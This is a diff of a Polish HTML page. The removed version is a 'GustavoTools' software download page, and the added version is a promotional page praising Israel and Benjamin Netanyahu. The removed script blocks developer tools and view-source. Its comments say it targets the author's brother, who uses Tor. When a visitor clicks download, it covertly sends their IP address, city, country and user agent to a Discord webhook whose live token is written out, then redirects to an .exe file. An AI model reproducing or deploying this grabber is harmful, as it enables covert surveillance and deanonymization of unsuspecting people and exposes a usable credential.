@@ -1,105 +1,229 @@
 <!DOCTYPE html>
 <html lang="pl">
 <head>
-  <meta charset="UTF-8" />
-  <title>GustavoTools</title>
-  <style>
-    body {
-      background-color: black;
-      color: #ff073a;
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding-top: 100px;
-    }
-    h1 {
-      font-size: 48px;
-      text-shadow: 0 0 10px #ff073a, 0 0 20px #ff073a;
-    }
-    button {
-      padding: 20px 40px;
-      font-size: 24px;
-      color: white;
-      background-color: #ff073a;
-      border: none;
-      border-radius: 12px;
-      cursor: pointer;
-      box-shadow: 0 0 20px #ff073a;
-      margin: 10px;
-    }
-    button:hover {
-      background-color: #cc0029;
-    }
-    p {
-      font-size: 14px;
-      margin-top: 40px;
-      color: #ccc;
-    }
-  </style>
+<meta charset="UTF-8">
+<title>Państwo Izrael – Siła, Historia i Przywództwo</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+:root {
+    --israel-blue: #0038b8;
+    --israel-light-blue: #1e5eff;
+    --israel-white: #ffffff;
+}
+
+/* ===== TŁO Z GWIAZDAMI DAWIDA ===== */
+body {
+    margin: 0;
+    font-family: "Segoe UI", Arial, sans-serif;
+    color: #102a43;
+    line-height: 1.7;
+    background-color: #f8fbff;
+    background-image:
+        url("data:image/svg+xml;utf8,\
+        <svg xmlns='http://www.w3.org/2000/svg' width='120' height='120' viewBox='0 0 120 120'>\
+        <polygon points='60,20 80,60 60,100 40,60' fill='none' stroke='%230038b8' stroke-width='2'/>\
+        <polygon points='60,20 100,60 60,100 20,60' fill='none' stroke='%230038b8' stroke-width='2' transform='rotate(90 60 60)'/>\
+        </svg>");
+    background-size: 120px 120px;
+}
+
+/* ===== HEADER ===== */
+header {
+    background: linear-gradient(135deg, var(--israel-blue), var(--israel-light-blue));
+    color: var(--israel-white);
+    padding: 70px 20px 50px;
+    text-align: center;
+    position: relative;
+}
+
+/* ===== FLAGI ===== */
+.flag-container {
+    display: flex;
+    justify-content: center;
+    gap: 40px;
+    margin-bottom: 25px;
+}
+
+.flag {
+    width: 140px;
+    height: 90px;
+    box-shadow: 0 6px 18px rgba(0,0,0,0.25);
+}
+
+header h1 {
+    font-size: 3rem;
+    margin: 10px 0;
+}
+
+header p {
+    max-width: 900px;
+    margin: 0 auto;
+    font-size: 1.25rem;
+}
+
+/* ===== NAV ===== */
+nav {
+    background-color: white;
+    border-bottom: 3px solid var(--israel-blue);
+    padding: 12px 20px;
+    text-align: center;
+}
+
+nav a {
+    margin: 0 14px;
+    text-decoration: none;
+    color: var(--israel-blue);
+    font-weight: 700;
+}
+
+/* ===== SEKCJE ===== */
+section {
+    max-width: 1100px;
+    margin: 60px auto;
+    padding: 0 20px;
+}
+
+section h2 {
+    color: var(--israel-blue);
+    font-size: 2.2rem;
+    margin-bottom: 20px;
+    border-left: 6px solid var(--israel-blue);
+    padding-left: 15px;
+}
+
+section p {
+    font-size: 1.1rem;
+    margin-bottom: 18px;
+}
+
+/* ===== CYTAT ===== */
+blockquote {
+    background: white;
+    border-left: 6px solid var(--israel-blue);
+    padding: 25px;
+    margin: 40px 0;
+    font-style: italic;
+    box-shadow: 0 6px 16px rgba(0,0,0,0.1);
+}
+
+/* ===== FOOTER ===== */
+footer {
+    background-color: var(--israel-blue);
+    color: white;
+    text-align: center;
+    padding: 40px 20px;
+    margin-top: 80px;
+}
+
+footer p {
+    margin: 6px 0;
+    font-size: 0.95rem;
+}
+</style>
 </head>
+
 <body>
-  <h1>GustavoTools</h1>
-  <button onclick="handleDownload()">Pobierz najnowszą wersję</button>
 
-  <script>
-    //brat korzysta z tora i mysli ze jest niezniszczalny
-    //zbieram ip dla statystyk
-    document.addEventListener("contextmenu", e => e.preventDefault());
+<header>
 
-    document.addEventListener("keydown", function (e) {
-      const blockedCombos = [
-        (e.ctrlKey && e.key.toLowerCase() === "u"),       // Ctrl+U
-        (e.key === "F12"),                                 // F12
-        (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "i"), // Ctrl+Shift+I
-        (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "j"), // Ctrl+Shift+J
-        (e.ctrlKey && e.key.toLowerCase() === "s"),        // Ctrl+S
-        (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "c")  // Ctrl+Shift+C
-      ];
-      if (blockedCombos.some(Boolean)) {
-        e.preventDefault();
-        return false;
-      }
-    });
+<div class="flag-container">
+<!-- Flaga Izraela – SVG -->
+<svg class="flag" viewBox="0 0 200 130" xmlns="http://www.w3.org/2000/svg">
+    <rect width="200" height="130" fill="white"/>
+    <rect y="15" width="200" height="20" fill="#0038b8"/>
+    <rect y="95" width="200" height="20" fill="#0038b8"/>
+    <polygon points="100,40 115,65 100,90 85,65" fill="none" stroke="#0038b8" stroke-width="5"/>
+    <polygon points="100,40 125,65 100,90 75,65" fill="none" stroke="#0038b8" stroke-width="5" transform="rotate(90 100 65)"/>
+</svg>
 
-    (function () {
-      const threshold = 160;
-      setInterval(() => {
-        const devtoolsOpened = (
-          window.outerWidth - window.innerWidth > threshold ||
-          window.outerHeight - window.innerHeight > threshold
-        );
-        if (devtoolsOpened) {
-          document.body.innerHTML = "<h1 style='color:red'>Zabronione narzędzia deweloperskie</h1>";
-        }
-      }, 1000);
-    })();
+<svg class="flag" viewBox="0 0 200 130" xmlns="http://www.w3.org/2000/svg">
+    <rect width="200" height="130" fill="white"/>
+    <rect y="15" width="200" height="20" fill="#0038b8"/>
+    <rect y="95" width="200" height="20" fill="#0038b8"/>
+    <polygon points="100,40 115,65 100,90 85,65" fill="none" stroke="#0038b8" stroke-width="5"/>
+    <polygon points="100,40 125,65 100,90 75,65" fill="none" stroke="#0038b8" stroke-width="5" transform="rotate(90 100 65)"/>
+</svg>
+</div>
 
-    async function handleDownload() {
-      try {
-        const location = await fetch("https://ipapi.co/json/").then(res => res.json());
+<h1>Państwo Izrael</h1>
+<p>
+Nowoczesne, innowacyjne i silne państwo, które łączy starożytną historię z nowoczesną demokracją,
+technologią i niezłomną wolą przetrwania.
+</p>
 
-        const ip = location.ip || "Nieznane";
-        const city = location.city || "Nieznane";
-        const country = location.country_name || "Nieznane";
-        const userAgent = navigator.userAgent;
+</header>
 
-        const message = `**Nowe pobranie GustavoTools**
-🌐 IP: \`${ip}\`
-🏙️ Miasto: \`${city}\`
-🏴 Kraj: \`${country}\`
-📱 Urządzenie: \`${userAgent}\`
-**pobrana wersja: v1.0.0**`;
+<nav>
+    <a href="#historia">Historia</a>
+    <a href="#innowacje">Innowacje</a>
+    <a href="#bezpieczenstwo">Bezpieczeństwo</a>
+    <a href="#netanyahu">Przywództwo</a>
+</nav>
 
-        await fetch("https://discord.com/api/webhooks/1393263141521068092/gRsMdeMV-ujuNso9z839i1WbNekal2jTi-r80AMaVCgWdJwCtYh5IOn5vgiPl5KRsD3a", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ content: message })
-        });
-      } catch (error) {
-        console.warn("Nie udało się wysłać danych na webhook (CORS?):", error);
-      }
+<section id="historia">
+<h2>Historia i tożsamość Izraela</h2>
+<p>
+Państwo Izrael jest wyjątkowym przykładem odrodzenia narodowego w historii świata. Po tysiącach lat
+diaspory naród żydowski odzyskał swoją suwerenność, tworząc nowoczesne państwo oparte na prawie,
+demokracji i głębokim poczuciu tożsamości kulturowej.
+</p>
+<p>
+Izrael łączy starożytne dziedzictwo Jerozolimy z dynamiką XXI wieku. To kraj, który potrafił przekształcić
+pustynie w żyzne tereny, a zagrożenia egzystencjalne w siłę strategiczną.
+</p>
+</section>
 
-      window.location.href = "https://github.com/kostek1123Q/gustavotools1.1.0/releases/download/v.1.1.0/GustavoTools1.1.0.exe";
-    }
-  </script>
+<section id="innowacje">
+<h2>Innowacyjność i rozwój</h2>
+<p>
+Izrael jest jednym z najbardziej innowacyjnych państw świata. Od cyberbezpieczeństwa, przez medycynę,
+rolnictwo precyzyjne, po sztuczną inteligencję – izraelskie rozwiązania zmieniają globalną gospodarkę.
+</p>
+<p>
+Silne zaplecze naukowe, kultura przedsiębiorczości oraz współpraca między wojskiem, nauką i biznesem
+czynią Izrael prawdziwą „Start-up Nation”.
+</p>
+</section>
+
+<section id="bezpieczenstwo">
+<h2>Bezpieczeństwo i odpowiedzialność</h2>
+<p>
+Izrael od samego początku istnienia musiał dbać o swoje bezpieczeństwo. Rozwój nowoczesnych systemów
+obronnych oraz wysoki poziom gotowości strategicznej są elementami stabilizującymi region.
+</p>
+<p>
+Silna armia, nowoczesna technologia i jasna doktryna obronna pozwalają Izraelowi chronić swoich
+obywateli oraz zachować suwerenność.
+</p>
+</section>
+
+<section id="netanyahu">
+<h2>Benjamin Netanjahu – przywództwo i wizja</h2>
+<p>
+Benjamin Netanjahu jest jednym z najbardziej rozpoznawalnych i doświadczonych przywódców w historii
+Izraela. Jego polityka opiera się na wzmacnianiu bezpieczeństwa, suwerenności państwa oraz pozycji
+Izraela na arenie międzynarodowej.
+</p>
+<p>
+Pod jego przywództwem Izrael rozwijał relacje dyplomatyczne, umacniał gospodarkę i konsekwentnie
+realizował strategię narodowych interesów.
+</p>
+
+<blockquote>
+„Silny Izrael to Izrael, który potrafi bronić siebie, rozwijać się gospodarczo
+i zachować swoją tożsamość w zmieniającym się świecie.”
+</blockquote>
+
+<p>
+Netanjahu symbolizuje ciągłość izraelskiego przywództwa – połączenie realizmu, doświadczenia oraz
+determinacji w działaniu.
+</p>
+</section>
+
+<footer>
+<p>© Państwo Izrael</p>
+</footer>
+
 </body>
 </html>
